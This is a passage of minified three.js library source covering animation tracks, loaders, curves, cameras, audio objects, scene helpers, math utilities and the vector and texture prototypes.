Zc(a,b,c,d){xa.call(this,a,b,c,d)}function Cd(a,b,c,d){xa.call(this,a,b,c,d)}function xb(a,b,c,d){if(void 0===a)throw Error(\"track name is undefined\");if(void 0===b||0===b.length)throw Error(\"no keyframes in track named \"+a);this.name=a;this.times=na.convertArray(b,this.TimeBufferType);this.values=na.convertArray(c,this.ValueBufferType);this.setInterpolation(d||this.DefaultInterpolation);this.validate();this.optimize()}function dc(a,b,\nc,d){xb.call(this,a,b,c,d)}function Dd(a,b,c,d){xa.call(this,a,b,c,d)}function $c(a,b,c,d){xb.call(this,a,b,c,d)}function ec(a,b,c,d){xb.call(this,a,b,c,d)}function Ed(a,b,c,d){xb.call(this,a,b,c,d)}function Fd(a,b,c){xb.call(this,a,b,c)}function Gd(a,b,c,d){xb.call(this,a,b,c,d)}function yb(a,b,c,d){xb.apply(this,arguments)}function qa(a,b,c){this.name=a;this.tracks=c;this.duration=void 0!==b?b:-1;this.uuid=N.generateUUID();0>this.duration&&this.resetDuration();this.optimize()}function Hd(a){this.manager=\nvoid 0!==a?a:ta;this.textures={}}function ce(a){this.manager=void 0!==a?a:ta}function zb(){this.onLoadStart=function(){};this.onLoadProgress=function(){};this.onLoadComplete=function(){}}function de(a){\"boolean\"===typeof a&&(console.warn(\"THREE.JSONLoader: showStatus parameter has been removed from constructor.\"),a=void 0);this.manager=void 0!==a?a:ta;this.withCredentials=!1}function Se(a){this.manager=void 0!==a?a:ta;this.texturePath=\"\"}function Te(a,b,c,d,e){b=.5*(d-b);e=.5*(e-c);var f=a*a;return(2*\nc-2*d+b+e)*a*f+(-3*c+3*d-2*b-e)*f+b*a+c}function Ab(a,b,c,d){var e=1-a;return e*e*b+2*(1-a)*a*c+a*a*d}function Bb(a,b,c,d,e){var f=1-a,g=1-a;return f*f*f*b+3*g*g*a*c+3*(1-a)*a*a*d+a*a*a*e}function ua(){}function Ta(a,b){this.v1=a;this.v2=b}function ad(){this.curves=[];this.autoClose=!1}function Wa(a,b,c,d,e,f,g,h){this.aX=a;this.aY=b;this.xRadius=c;this.yRadius=d;this.aStartAngle=e;this.aEndAngle=f;this.aClockwise=g;this.aRotation=h||0}function Cb(a){this.points=void 0===a?[]:a}function fc(a,b,c,\nd){this.v0=a;this.v1=b;this.v2=c;this.v3=d}function gc(a,b,c){this.v0=a;this.v1=b;this.v2=c}function bd(a){ad.call(this);this.currentPoint=new D;a&&this.fromPoints(a)}function Db(){bd.apply(this,arguments);this.holes=[]}function ee(){this.subPaths=[];this.currentPath=null}function fe(a){this.data=a}function Ue(a){this.manager=void 0!==a?a:ta}function ge(a){this.manager=void 0!==a?a:ta}function he(a,b,c,d){ma.call(this,a,b);this.type=\"RectAreaLight\";this.position.set(0,1,0);this.updateMatrix();this.width=\nvoid 0!==c?c:10;this.height=void 0!==d?d:10}function Ve(){this.type=\"StereoCamera\";this.aspect=1;this.eyeSep=.064;this.cameraL=new Fa;this.cameraL.layers.enable(1);this.cameraL.matrixAutoUpdate=!1;this.cameraR=new Fa;this.cameraR.layers.enable(2);this.cameraR.matrixAutoUpdate=!1}function Id(a,b,c){x.call(this);this.type=\"CubeCamera\";var d=new Fa(90,1,a,b);d.up.set(0,-1,0);d.lookAt(new q(1,0,0));this.add(d);var e=new Fa(90,1,a,b);e.up.set(0,-1,0);e.lookAt(new q(-1,0,0));this.add(e);var f=new Fa(90,\n1,a,b);f.up.set(0,0,1);f.lookAt(new q(0,1,0));this.add(f);var g=new Fa(90,1,a,b);g.up.set(0,0,-1);g.lookAt(new q(0,-1,0));this.add(g);var h=new Fa(90,1,a,b);h.up.set(0,-1,0);h.lookAt(new q(0,0,1));this.add(h);var m=new Fa(90,1,a,b);m.up.set(0,-1,0);m.lookAt(new q(0,0,-1));this.add(m);this.renderTarget=new Gb(c,c,{format:1022,magFilter:1006,minFilter:1006});this.updateCubeMap=function(a,b){null===this.parent&&this.updateMatrixWorld();var c=this.renderTarget,n=c.texture.generateMipmaps;c.texture.generateMipmaps=\n!1;c.activeCubeFace=0;a.render(b,d,c);c.activeCubeFace=1;a.render(b,e,c);c.activeCubeFace=2;a.render(b,f,c);c.activeCubeFace=3;a.render(b,g,c);c.activeCubeFace=4;a.render(b,h,c);c.texture.generateMipmaps=n;c.activeCubeFace=5;a.render(b,m,c);a.setRenderTarget(null)}}function ie(){x.call(this);this.type=\"AudioListener\";this.context=je.getContext();this.gain=this.context.createGain();this.gain.connect(this.context.destination);this.filter=null}function hc(a){x.call(this);this.type=\"Audio\";this.context=\na.context;this.gain=this.context.createGain();this.gain.connect(a.getInput());this.autoplay=!1;this.buffer=null;this.loop=!1;this.startTime=0;this.playbackRate=1;this.isPlaying=!1;this.hasPlaybackControl=!0;this.sourceType=\"empty\";this.filters=[]}function ke(a){hc.call(this,a);this.panner=this.context.createPanner();this.panner.connect(this.gain)}function le(a,b){this.analyser=a.context.createAnalyser();this.analyser.fftSize=void 0!==b?b:2048;this.data=new Uint8Array(this.analyser.frequencyBinCount);\na.getOutput().connect(this.analyser)}function Jd(a,b,c){this.binding=a;this.valueSize=c;a=Float64Array;switch(b){case \"quaternion\":b=this._slerp;break;case \"string\":case \"bool\":a=Array;b=this._select;break;default:b=this._lerp}this.buffer=new a(4*c);this._mixBufferRegion=b;this.referenceCount=this.useCount=this.cumulativeWeight=0}function ka(a,b,c){this.path=b;this.parsedPath=c||ka.parseTrackName(b);this.node=ka.findNode(a,this.parsedPath.nodeName)||a;this.rootNode=a}function me(a){this.uuid=N.generateUUID();\nthis._objects=Array.prototype.slice.call(arguments);this.nCachedObjects_=0;var b={};this._indicesByUUID=b;for(var c=0,d=arguments.length;c!==d;++c)b[arguments[c].uuid]=c;this._paths=[];this._parsedPaths=[];this._bindings=[];this._bindingsIndicesByPath={};var e=this;this.stats={objects:{get total(){return e._objects.length},get inUse(){return this.total-e.nCachedObjects_}},get bindingsPerObject(){return e._bindings.length}}}function ne(a,b,c){this._mixer=a;this._clip=b;this._localRoot=c||null;a=b.tracks;\nb=a.length;c=Array(b);for(var d={endingStart:2400,endingEnd:2400},e=0;e!==b;++e){var f=a[e].createInterpolant(null);c[e]=f;f.settings=d}this._interpolantSettings=d;this._interpolants=c;this._propertyBindings=Array(b);this._weightInterpolant=this._timeScaleInterpolant=this._byClipCacheIndex=this._cacheIndex=null;this.loop=2201;this._loopCount=-1;this._startTime=null;this.time=0;this._effectiveWeight=this.weight=this._effectiveTimeScale=this.timeScale=1;this.repetitions=Infinity;this.paused=!1;this.enabled=\n!0;this.clampWhenFinished=!1;this.zeroSlopeAtEnd=this.zeroSlopeAtStart=!0}function cd(a){this._root=a;this._initMemoryManager();this.time=this._accuIndex=0;this.timeScale=1}function Kd(a,b){\"string\"===typeof a&&(console.warn(\"THREE.Uniform: Type parameter is no longer needed.\"),a=b);this.value=a}function Eb(){I.call(this);this.type=\"InstancedBufferGeometry\";this.maxInstancedCount=void 0}function oe(a,b,c,d){this.uuid=N.generateUUID();this.data=a;this.itemSize=b;this.offset=c;this.normalized=!0===\nd}function ic(a,b){this.uuid=N.generateUUID();this.array=a;this.stride=b;this.count=void 0!==a?a.length/b:0;this.dynamic=!1;this.updateRange={offset:0,count:-1};this.onUploadCallback=function(){};this.version=0}function jc(a,b,c){ic.call(this,a,b);this.meshPerAttribute=c||1}function kc(a,b,c){U.call(this,a,b);this.meshPerAttribute=c||1}function pe(a,b,c,d){this.ray=new cb(a,b);this.near=c||0;this.far=d||Infinity;this.params={Mesh:{},Line:{},LOD:{},Points:{threshold:1},Sprite:{}};Object.defineProperties(this.params,\n{PointCloud:{get:function(){console.warn(\"THREE.Raycaster: params.PointCloud has been renamed to params.Points.\");return this.Points}}})}function We(a,b){return a.distance-b.distance}function qe(a,b,c,d){if(!1!==a.visible&&(a.raycast(b,c),!0===d)){a=a.children;d=0;for(var e=a.length;d<e;d++)qe(a[d],b,c,!0)}}function re(a){this.autoStart=void 0!==a?a:!0;this.elapsedTime=this.oldTime=this.startTime=0;this.running=!1}function se(a,b,c){this.radius=void 0!==a?a:1;this.phi=void 0!==b?b:0;this.theta=void 0!==\nc?c:0;return this}function te(a,b,c){this.radius=void 0!==a?a:1;this.theta=void 0!==b?b:0;this.y=void 0!==c?c:0;return this}function oa(a,b){Aa.call(this,a,b);this.animationsMap={};this.animationsList=[];var c=this.geometry.morphTargets.length;this.createAnimation(\"__default\",0,c-1,c/1);this.setAnimationWeight(\"__default\",1)}function dd(a){x.call(this);this.material=a;this.render=function(a){}}function ed(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16711680;d=void 0!==d?d:1;b=0;\n(c=this.object.geometry)&&c.isGeometry?b=3*c.faces.length:c&&c.isBufferGeometry&&(b=c.attributes.normal.count);c=new I;b=new z(6*b,3);c.addAttribute(\"position\",b);ga.call(this,c,new ia({color:a,linewidth:d}));this.matrixAutoUpdate=!1;this.update()}function lc(a){x.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;a=new I;for(var b=[0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,-1,0,1,0,0,0,0,1,1,0,0,0,0,-1,1],c=0,d=1;32>c;c++,d++){var e=c/32*Math.PI*2,f=d/32*\nMath.PI*2;b.push(Math.cos(e),Math.sin(e),1,Math.cos(f),Math.sin(f),1)}a.addAttribute(\"position\",new z(b,3));b=new ia({fog:!1});this.cone=new ga(a,b);this.add(this.cone);this.update()}function mc(a){this.bones=this.getBoneList(a);for(var b=new I,c=[],d=[],e=new J(0,0,1),f=new J(0,1,0),g=0;g<this.bones.length;g++){var h=this.bones[g];h.parent&&h.parent.isBone&&(c.push(0,0,0),c.push(0,0,0),d.push(e.r,e.g,e.b),d.push(f.r,f.g,f.b))}b.addAttribute(\"position\",new z(c,3));b.addAttribute(\"color\",new z(d,3));\nc=new ia({vertexColors:2,depthTest:!1,depthWrite:!1,transparent:!0});ga.call(this,b,c);this.root=a;this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;this.update()}function nc(a,b){this.light=a;this.light.updateMatrixWorld();var c=new pb(b,4,2),d=new Ka({wireframe:!0,fog:!1});d.color.copy(this.light.color).multiplyScalar(this.light.intensity);Aa.call(this,c,d);this.matrix=this.light.matrixWorld;this.matrixAutoUpdate=!1}function oc(a){x.call(this);this.light=a;this.light.updateMatrixWorld();var b=\nnew Ka({color:a.color,fog:!1});a=new Ka({color:a.color,fog:!1,wireframe:!0});var c=new I;c.addAttribute(\"position\",new U(new Float32Array(18),3));this.add(new Aa(c,b));this.add(new Aa(c,a));this.update()}function pc(a,b){x.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;var c=new ob(b);c.rotateY(.5*Math.PI);var d=new Ka({vertexColors:2,wireframe:!0}),e=c.getAttribute(\"position\"),e=new Float32Array(3*e.count);c.addAttribute(\"color\",new U(e,\n3));this.add(new Aa(c,d));this.update()}function fd(a,b,c,d){a=a||10;b=b||10;c=new J(void 0!==c?c:4473924);d=new J(void 0!==d?d:8947848);var e=b/2,f=a/b,g=a/2;a=[];for(var h=[],m=0,k=0,t=-g;m<=b;m++,t+=f){a.push(-g,0,t,g,0,t);a.push(t,0,-g,t,0,g);var l=m===e?c:d;l.toArray(h,k);k+=3;l.toArray(h,k);k+=3;l.toArray(h,k);k+=3;l.toArray(h,k);k+=3}b=new I;b.addAttribute(\"position\",new z(a,3));b.addAttribute(\"color\",new z(h,3));c=new ia({vertexColors:2});ga.call(this,b,c)}function Ld(a,b,c,d,e,f){a=a||10;\nb=b||16;c=c||8;d=d||64;e=new J(void 0!==e?e:4473924);f=new J(void 0!==f?f:8947848);var g=[],h=[],m,k,t,l,n;for(t=0;t<=b;t++)k=t/b*2*Math.PI,m=Math.sin(k)*a,k=Math.cos(k)*a,g.push(0,0,0),g.push(m,0,k),n=t&1?e:f,h.push(n.r,n.g,n.b),h.push(n.r,n.g,n.b);for(t=0;t<=c;t++)for(n=t&1?e:f,l=a-a/c*t,b=0;b<d;b++)k=b/d*2*Math.PI,m=Math.sin(k)*l,k=Math.cos(k)*l,g.push(m,0,k),h.push(n.r,n.g,n.b),k=(b+1)/d*2*Math.PI,m=Math.sin(k)*l,k=Math.cos(k)*l,g.push(m,0,k),h.push(n.r,n.g,n.b);a=new I;a.addAttribute(\"position\",\nnew z(g,3));a.addAttribute(\"color\",new z(h,3));g=new ia({vertexColors:2});ga.call(this,a,g)}function gd(a,b,c,d){this.object=a;this.size=void 0!==b?b:1;a=void 0!==c?c:16776960;d=void 0!==d?d:1;b=0;(c=this.object.geometry)&&c.isGeometry?b=c.faces.length:console.warn(\"THREE.FaceNormalsHelper: only THREE.Geometry is supported. Use THREE.VertexNormalsHelper, instead.\");c=new I;b=new z(6*b,3);c.addAttribute(\"position\",b);ga.call(this,c,new ia({color:a,linewidth:d}));this.matrixAutoUpdate=!1;this.update()}\nfunction qc(a,b){x.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;void 0===b&&(b=1);var c=new I;c.addAttribute(\"position\",new z([-b,b,0,b,b,0,b,-b,0,-b,-b,0,-b,b,0],3));var d=new ia({fog:!1});this.add(new Ua(c,d));c=new I;c.addAttribute(\"position\",new z([0,0,0,0,0,1],3));this.add(new Ua(c,d));this.update()}function hd(a){function b(a,b,d){c(a,d);c(b,d)}function c(a,b){f.push(0,0,0);g.push(b.r,b.g,b.b);void 0===h[a]&&(h[a]=[]);h[a].push(f.length/\n3-1)}var d=new I,e=new ia({color:16777215,vertexColors:1}),f=[],g=[],h={},m=new J(16755200),k=new J(16711680),l=new J(43775),p=new J(16777215),n=new J(3355443);b(\"n1\",\"n2\",m);b(\"n2\",\"n4\",m);b(\"n4\",\"n3\",m);b(\"n3\",\"n1\",m);b(\"f1\",\"f2\",m);b(\"f2\",\"f4\",m);b(\"f4\",\"f3\",m);b(\"f3\",\"f1\",m);b(\"n1\",\"f1\",m);b(\"n2\",\"f2\",m);b(\"n3\",\"f3\",m);b(\"n4\",\"f4\",m);b(\"p\",\"n1\",k);b(\"p\",\"n2\",k);b(\"p\",\"n3\",k);b(\"p\",\"n4\",k);b(\"u1\",\"u2\",l);b(\"u2\",\"u3\",l);b(\"u3\",\"u1\",l);b(\"c\",\"t\",p);b(\"p\",\"c\",n);b(\"cn1\",\"cn2\",n);b(\"cn3\",\"cn4\",n);\nb(\"cf1\",\"cf2\",n);b(\"cf3\",\"cf4\",n);d.addAttribute(\"position\",new z(f,3));d.addAttribute(\"color\",new z(g,3));ga.call(this,d,e);this.camera=a;this.camera.updateProjectionMatrix&&this.camera.updateProjectionMatrix();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;this.pointMap=h;this.update()}function rc(a,b){void 0===b&&(b=16776960);var c=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),d=new Float32Array(24),e=new I;e.setIndex(new U(c,1));e.addAttribute(\"position\",new U(d,3));ga.call(this,\ne,new ia({color:b}));void 0!==a&&this.update(a)}function Fb(a,b,c,d,e,f){x.call(this);void 0===d&&(d=16776960);void 0===c&&(c=1);void 0===e&&(e=.2*c);void 0===f&&(f=.2*e);void 0===Md&&(Md=new I,Md.addAttribute(\"position\",new z([0,0,0,0,1,0],3)),ue=new Va(0,.5,1,5,1),ue.translate(0,-.5,0));this.position.copy(b);this.line=new Ua(Md,new ia({color:d}));this.line.matrixAutoUpdate=!1;this.add(this.line);this.cone=new Aa(ue,new Ka({color:d}));this.cone.matrixAutoUpdate=!1;this.add(this.cone);this.setDirection(a);\nthis.setLength(c,e,f)}function Nd(a){a=a||1;var b=[0,0,0,a,0,0,0,0,0,0,a,0,0,0,0,0,0,a];a=new I;a.addAttribute(\"position\",new z(b,3));a.addAttribute(\"color\",new z([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1],3));b=new ia({vertexColors:2});ga.call(this,a,b)}function ve(){var a=0,b=0,c=0,d=0;return{initCatmullRom:function(e,f,g,h,m){e=m*(g-e);h=m*(h-f);a=f;b=e;c=-3*f+3*g-2*e-h;d=2*f-2*g+e+h},initNonuniformCatmullRom:function(e,f,g,h,m,k,l){e=((f-e)/m-(g-e)/(m+k)+(g-f)/k)*k;h=((g-f)/k-(h-f)/(k+l)+(h-g)/\nl)*k;a=f;b=e;c=-3*f+3*g-2*e-h;d=2*f-2*g+e+h},calc:function(e){var f=e*e;return a+b*e+c*f+d*f*e}}}function va(a){this.points=a||[];this.closed=!1}function id(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d}function jd(a,b,c){this.v0=a;this.v1=b;this.v2=c}function kd(a,b){this.v1=a;this.v2=b}function Od(a,b,c,d,e,f){Wa.call(this,a,b,c,c,d,e,f)}function Xe(a){console.warn(\"THREE.ClosedSplineCurve3 has been deprecated. Use THREE.CatmullRomCurve3 instead.\");va.call(this,a);this.type=\"catmullrom\";this.closed=\n!0}function Ye(a){console.warn(\"THREE.SplineCurve3 has been deprecated. Use THREE.CatmullRomCurve3 instead.\");va.call(this,a);this.type=\"catmullrom\"}function we(a){console.warn(\"THREE.Spline has been removed. Use THREE.CatmullRomCurve3 instead.\");va.call(this,a);this.type=\"catmullrom\"}void 0===Number.EPSILON&&(Number.EPSILON=Math.pow(2,-52));void 0===Math.sign&&(Math.sign=function(a){return 0>a?-1:0<a?1:+a});void 0===Function.prototype.name&&Object.defineProperty(Function.prototype,\"name\",{get:function(){return this.toString().match(/^\\s*function\\s*([^\\(\\s]*)/)[1]}});\nvoid 0===Object.assign&&function(){Object.assign=function(a){if(void 0===a||null===a)throw new TypeError(\"Cannot convert undefined or null to object\");for(var b=Object(a),c=1;c<arguments.length;c++){var d=arguments[c];if(void 0!==d&&null!==d)for(var e in d)Object.prototype.hasOwnProperty.call(d,e)&&(b[e]=d[e])}return b}}();pa.prototype={addEventListener:function(a,b){void 0===this._listeners&&(this._listeners={});var c=this._listeners;void 0===c[a]&&(c[a]=[]);-1===c[a].indexOf(b)&&c[a].push(b)},hasEventListener:function(a,\nb){if(void 0===this._listeners)return!1;var c=this._listeners;return void 0!==c[a]&&-1!==c[a].indexOf(b)},removeEventListener:function(a,b){if(void 0!==this._listeners){var c=this._listeners[a];if(void 0!==c){var d=c.indexOf(b);-1!==d&&c.splice(d,1)}}},dispatchEvent:function(a){if(void 0!==this._listeners){var b=this._listeners[a.type];if(void 0!==b){a.target=this;var c=[],d,e=b.length;for(d=0;d<e;d++)c[d]=b[d];for(d=0;d<e;d++)c[d].call(this,a)}}}};var N={DEG2RAD:Math.PI/180,RAD2DEG:180/Math.PI,generateUUID:function(){var a=\n\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\".split(\"\"),b=Array(36),c=0,d;return function(){for(var e=0;36>e;e++)8===e||13===e||18===e||23===e?b[e]=\"-\":14===e?b[e]=\"4\":(2>=c&&(c=33554432+16777216*Math.random()|0),d=c&15,c>>=4,b[e]=a[19===e?d&3|8:d]);return b.join(\"\")}}(),clamp:function(a,b,c){return Math.max(b,Math.min(c,a))},euclideanModulo:function(a,b){return(a%b+b)%b},mapLinear:function(a,b,c,d,e){return d+(a-b)*(e-d)/(c-b)},lerp:function(a,b,c){return(1-c)*a+c*b},smoothstep:function(a,\nb,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*(3-2*a)},smootherstep:function(a,b,c){if(a<=b)return 0;if(a>=c)return 1;a=(a-b)/(c-b);return a*a*a*(a*(6*a-15)+10)},randInt:function(a,b){return a+Math.floor(Math.random()*(b-a+1))},randFloat:function(a,b){return a+Math.random()*(b-a)},randFloatSpread:function(a){return a*(.5-Math.random())},degToRad:function(a){return a*N.DEG2RAD},radToDeg:function(a){return a*N.RAD2DEG},isPowerOfTwo:function(a){return 0===(a&a-1)&&0!==a},nearestPowerOfTwo:function(a){return Math.pow(2,\nMath.round(Math.log(a)/Math.LN2))},nextPowerOfTwo:function(a){a--;a|=a>>1;a|=a>>2;a|=a>>4;a|=a>>8;a|=a>>16;a++;return a}};D.prototype={constructor:D,isVector2:!0,get width(){return this.x},set width(a){this.x=a},get height(){return this.y},set height(a){this.y=a},set:function(a,b){this.x=a;this.y=b;return this},setScalar:function(a){this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;\ncase 1:this.y=b;break;default:throw Error(\"index is out of range: \"+a);}return this},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y)},copy:function(a){this.x=a.x;this.y=a.y;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;\nthis.y+=a.y;return this},addScalar:function(a){this.x+=a;this.y+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;return this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector2: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;return this},subScalar:function(a){this.x-=a;this.y-=a;return this},subVectors:function(a,b){this.x=\na.x-b.x;this.y=a.y-b.y;return this},multiply:function(a){this.x*=a.x;this.y*=a.y;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a):this.y=this.x=0;return this},divide:function(a){this.x/=a.x;this.y/=a.y;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},min:function(a){this.x=Math.min(this.x,a.x);this.y=Math.min(this.y,a.y);return this},max:function(a){this.x=Math.max(this.x,a.x);this.y=Math.max(this.y,a.y);return this},clamp:function(a,b){this.x=Math.max(a.x,\nMath.min(b.x,this.x));this.y=Math.max(a.y,Math.min(b.y,this.y));return this},clampScalar:function(){var a,b;return function(c,d){void 0===a&&(a=new D,b=new D);a.set(c,c);b.set(d,d);return this.clamp(a,b)}}(),clampLength:function(a,b){var c=this.length();return this.multiplyScalar(Math.max(a,Math.min(b,c))/c)},floor:function(){this.x=Math.floor(this.x);this.y=Math.floor(this.y);return this},ceil:function(){this.x=Math.ceil(this.x);this.y=Math.ceil(this.y);return this},round:function(){this.x=Math.round(this.x);\nthis.y=Math.round(this.y);return this},roundToZero:function(){this.x=0>this.x?Math.ceil(this.x):Math.floor(this.x);this.y=0>this.y?Math.ceil(this.y):Math.floor(this.y);return this},negate:function(){this.x=-this.x;this.y=-this.y;return this},dot:function(a){return this.x*a.x+this.y*a.y},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)},normalize:function(){return this.divideScalar(this.length())},\nangle:function(){var a=Math.atan2(this.y,this.x);0>a&&(a+=2*Math.PI);return a},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x;a=this.y-a.y;return b*b+a*a},distanceToManhattan:function(a){return Math.abs(this.x-a.x)+Math.abs(this.y-a.y)},setLength:function(a){return this.multiplyScalar(a/this.length())},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;return this},lerpVectors:function(a,b,c){return this.subVectors(b,\na).multiplyScalar(c).add(a)},equals:function(a){return a.x===this.x&&a.y===this.y},fromArray:function(a,b){void 0===b&&(b=0);this.x=a[b];this.y=a[b+1];return this},toArray:function(a,b){void 0===a&&(a=[]);void 0===b&&(b=0);a[b]=this.x;a[b+1]=this.y;return a},fromBufferAttribute:function(a,b,c){void 0!==c&&console.warn(\"THREE.Vector2: offset has been removed from .fromBufferAttribute().\");this.x=a.getX(b);this.y=a.getY(b);return this},rotateAround:function(a,b){var c=Math.cos(b),d=Math.sin(b),e=this.x-\na.x,f=this.y-a.y;this.x=e*c-f*d+a.x;this.y=e*d+f*c+a.y;return this}};var Ze=0;ea.DEFAULT_IMAGE=void 0;ea.DEFAULT_MAPPING=300;ea.prototype={constructor:ea,isTexture:!0,set needsUpdate(a){!0===a&&this.version++},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.image=a.image;this.mipmaps=a.mipmaps.slice(0);this.mapping=a.mapping;this.wrapS=a.wrapS;this.wrapT=a.wrapT;this.magFilter=a.magFilter;this.minFilter=a.minFilter;this.anisotropy=a.anisotropy;this.format=a.format;\nthis.type=a.type;this.offset.copy(a.offset);this.repeat.copy(a.repeat);this.generateMipmaps=a.generateMipmaps;this.premultiplyAlpha=a.premultiplyAlpha;this.flipY=a.flipY;this.unpackAlignment=a.unpackAlignment;this.encoding=a.encoding;return this},toJSON:function(a){if(void 0!==a.textures[this.uuid])return a.textures[this.uuid];var b={metadata:{version:4.4,type:\"Texture\",generator:\"Texture.toJSON\"},uuid:this.uuid,name:this.name,mapping:this.mapping,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,\nthis.offset.y],wrap:[this.wrapS,this.wrapT],minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY};if(void 0!==this.image){var c=this.image;void 0===c.uuid&&(c.uuid=N.generateUUID());if(void 0===a.images[c.uuid]){var d=a.images,e=c.uuid,f=c.uuid,g;void 0!==c.toDataURL?g=c:(g=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\"),g.width=c.width,g.height=c.height,g.getContext(\"2d\").drawImage(c,0,0,c.width,c.height));g=2048<g.width||2048<g.height?g.toDataURL(\"image/jpeg\",\n.6):g.toDataURL(\"image/png\");d[e]={uuid:f,url:g}}b.image=c.uuid}return a.textures[this.uuid]=b},dispose:function(){this.dispatchEvent({type:\"dispose\"})},transformUv:function(a){if(300===this.mapping){a.multiply(this.repeat);a.add(this.offset);if(0>a.x||1<a.x)switch(this.wrapS){case 1E3:a.x-=Math.floor(a.x);break;case 1001:a.x=0>a.x?0:1;break;case 1002:a.x=1===Math.abs(Math.floor(a.x)%2)?Math.ceil(a.x)-a.x:a.x-Math.floor(a.x)}if(0>a.y||1<a.y)switch(this.wrapT){case 1E3:a.y-=Math.floor(a.y);break;case 1001:a.y=\n0>a.y?0:1;break;case 1002:a.y=1===Math.abs(Math.floor(a.y)%2)?Math.ceil(a.y)-a.y:a.y-Math.floor(a.y)}this.flipY&&(a.y=1-a.y)}}};Object.assign(ea.prototype,pa.prototype);fa.prototype={constructor:fa,isVector4:!0,set:function(a,b,c,d){this.x=a;this.y=b;this.z=c;this.w=d;return this},setScalar:function(a){this.w=this.z=this.y=this.x=a;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setW:function(a){this.w=a;return this},\nsetComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;case 3:this.w=b;break;default:throw Error(\"index is out of range: \"+a);}return this},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw Error(\"index is out of range: \"+a);}},clone:function(){return new this.constructor(this.x,this.y,this.z,this.w)},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=void 0!==a.w?\na.w:1;return this},add:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .add() now only accepts one argument. Use .addVectors( a, b ) instead.\"),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;this.w+=a.w;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;this.w+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;this.w=a.w+b.w;return this},addScaledVector:function(a,b){this.x+=a.x*b;this.y+=a.y*b;this.z+=a.z*b;this.w+=a.w*b;\nreturn this},sub:function(a,b){if(void 0!==b)return console.warn(\"THREE.Vector4: .sub() now only accepts one argument. Use .subVectors( a, b ) instead.\"),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;this.w-=a.w;return this},subScalar:function(a){this.x-=a;this.y-=a;this.z-=a;this.w-=a;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;this.w=a.w-b.w;return this},multiplyScalar:function(a){isFinite(a)?(this.x*=a,this.y*=a,this.z*=a,this.w*=a):this.w=this.z=\nthis.y=this.x=0;return this},applyMatrix4:function(a){var b=this.x,c=this.y,d=this.z,e=this.w;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*d+a[12]*e;this.y=a[1]*b+a[5]*c+a[9]*d+a[13]*e;this.z=a[2]*b+a[6]*c+a[10]*d+a[14]*e;this.w=a[3]*b+a[7]*c+a[11]*d+a[15]*e;return this},divideScalar:function(a){return this.multiplyScalar(1/a)},setAxisAngleFromQuaternion:function(a){this.w=2*Math.acos(a.w);var b=Math.sqrt(1-a.w*a.w);1E-4>b?(this.x=1,this.z=this.y=0):(this.x=a.x/b,this.y=a.y/b,this.z=a.z/b);return this},\nsetAxisAngleFromRotationMatrix:function(a){var b,c,d;a=a.elements;var e=a[0];d=a[4];var f=a[8],g=a[1],h=a[5],m=a[9];c=a[2];b=a[6];var k=a[10];if(.01>Math.abs(d-g)&&.01>Math.abs(f-c)&&.01>Math.abs(m-b)){if(.1>Math.abs(d+g)&&.1>Math.abs(f+c)&&.1>Math.abs(m+b)&&.1>Math.abs(e+h+k-3))return 